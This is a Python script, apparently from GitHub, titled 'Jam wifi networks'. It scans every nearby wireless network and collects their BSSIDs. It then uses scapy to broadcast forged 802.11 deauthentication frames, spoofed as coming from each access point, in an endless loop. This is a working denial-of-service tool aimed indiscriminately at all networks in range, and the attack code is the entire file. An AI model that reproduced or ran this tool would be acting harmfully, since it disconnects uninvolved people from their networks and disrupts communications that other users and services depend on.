# Jam wifi networks
# The reason this works on enveypted networks too is cuz encryptions only affect payloads not tha headers
# Author: astralm0nke on GitHub

from termcolor import colored
import wireless
from wifi import Cell  # Finds all open-air networks of a given interface
from scapy.all import RadioTap, Dot11, Dot11Deauth, send, conf

class WifiJammer:
    def __init__(self):
        self.wifi = wireless.Wireless()
        self.interface = self.wifi.interface()
        self.network_list = Cell.all(self.interface)
        self.bssids = []

    def __str__(self):
        return f'Interface: {self.interface}, Wireless: {self.wifi}'

    def get_networks(self):
        try:
            for network in self.network_list:
                print(f'Network Name: {network.ssid}\n')
                print(f'Network BSSID: {network.bssid}\n')
                print(f'Network Channel: {network.channel}\n')
                print(f'Network Quality: {network.quality}\n')
                print('\n')
                self.bssids.append(network.bssid)
        except Exception as e:
            print(colored(f'[-] No Networks Found: {e}', 'red'))

    def _jam(self, address):
        conf.iface = self.interface  # Use the interface from the object
        client_broadcast = 'FF:FF:FF:FF:FF:FF'  # Broadcast jamming packet to all clients
        conf.verb = 0  # Scapy verbosity
        packet = RadioTap() / Dot11(type=0, subtype=12, addr1=client_broadcast, addr2=address, addr3=address) / Dot11Deauth(reason=7)
        
        while True:
            send(packet)
            print(colored(f'[+]Deauthorization signal brodcast via {conf.iface} to BSSID: {address}', 'green'))
        '''
        Switch infinite loop out for this if u don't want to continuously jam:
        count = 4  # How many times we want to send the packet to target
        for n in range(count):
            send(packet)
            print(f'Deauth Num: {n+1} sent via {conf.iface} to BSSID: {address}')
        '''
            
    def jam(self):
        while True:
            for bssid in self.bssids:
                print(colored(f'[_-] Jamming on: {bssid}...', 'green'))
                self._jam(bssid)

if __name__ == '__main__':
    jammer = WifiJammer()
    jammer.get_networks()
    jammer.jam()
